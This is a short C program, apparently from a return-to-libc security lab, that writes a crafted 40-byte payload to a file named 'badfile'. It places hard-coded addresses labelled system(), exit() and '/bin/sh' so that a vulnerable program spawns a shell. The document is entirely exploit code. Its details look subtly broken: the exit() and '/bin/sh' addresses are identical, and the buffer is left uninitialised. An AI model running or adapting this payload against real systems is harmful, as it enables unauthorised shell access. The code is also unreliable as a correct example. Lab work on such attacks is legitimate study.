/* exploit_1.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
	char buf[40];
	FILE *badfile;
	badfile = fopen("./badfile", "w");

	
	*(long *) &buf[16] = 0x00200a5c; // system()
	*(long *) &buf[20] = 0xbffffef1; // exit()
	*(long *) &buf[24] = 0xbffffef1; // "/bin/sh"
	fwrite(buf, 40, 1, badfile);
	fclose(badfile);
}

//system("/bin/sh")
